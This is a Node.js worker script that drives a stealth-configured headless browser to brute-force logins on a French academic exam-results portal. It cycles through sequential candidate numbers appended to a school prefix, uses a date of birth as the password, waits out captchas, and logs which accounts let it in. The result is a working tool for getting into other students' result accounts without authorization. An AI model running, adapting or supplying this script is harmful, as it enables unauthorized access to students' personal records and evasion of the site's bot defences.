const puppeteer = require("puppeteer-extra");
const { parentPort } = require('worker_threads')
const pluginStealth = require("puppeteer-extra-plugin-stealth");

puppeteer.use(pluginStealth());

parentPort.addEventListener("message", async function (e) {
    let args = e.data.args;
    await start(args["base"], args["goal"], args["threadIndex"]);
}, false);

var errors = [];
var results = [];

async function start(base, goal, threadIndex) {
    const browser = await puppeteer.launch({headless: false, args: ["--window-size=600,1000", "--window-position="+(-600 * (threadIndex)) + ",000"]});
    parentPort.postMessage("Good starting with base "+base+" and goal "+goal);

    for(let current = base; current < goal; current++){
        current = String(current).padStart(3, '0'); //convert it to string using 001 instead of 1
        if(current % 5 == 0 && current !== String(base).padStart(3, '0')) {
            parentPort.postMessage("Sleeping for 5 seconds, currently at "+current);
            await sleep(5000);
        }

        startProcess(browser, current);
    }

    await sleep(5000);
    parentPort.postMessage("Finished, errors: "+errors.length+" results: "+results.length);
    console.log(results);
    process.exit();
}

async function startProcess (browser, current, retry = false, good = false) {
    try {
        parentPort.postMessage("Starting process for "+current);
        const page = await browser.newPage();

        await page.goto('https://c-resultats.ac-strasbourg.fr/publication_A15/login');

        if (await page.$('#imgCaptcha') !== null) {
            parentPort.postMessage("Requiring captcha, locked at "+current);
            await sleep(5000000)
        }

        await page.type('#j_username', '00000000'+current); //your school prefix (for me 8 numbers + 3 of current)
        await page.type('#j_password', 'dd/mm/yyyy'); //birthday with dd/mm/yyyy

        await page.click('#content > form > fieldset > div.loginBoutons > input:nth-child(1)');

        //wait for page load
        //await page.waitForNavigation({waitUntil: 'networkidle0'});
        parentPort.postMessage("Searching for results for "+current);
        await sleep(400);

        if (await page.$('#content > pre') !== null) {
            page.close();
            parentPort.postMessage("Bad login " +current);
        } else {
            page.close();
            if(good) {
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                parentPort.postMessage("Good login " +current);
                results.push(current);
                await sleep(1000);
            } else {
                parentPort.postMessage('Probably good login, checking again : '+current);
                await sleep(1000);
                await startProcess(browser, current, false, true);
            }
        }
    } catch (e) {
        if(retry){
            errors.push(current);
            parentPort.postMessage(e.message);
        } else {
            parentPort.postMessage(e.message);
            parentPort.postMessage("Retrying "+current);
            startProcess(browser, current, true);
        }
    }
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}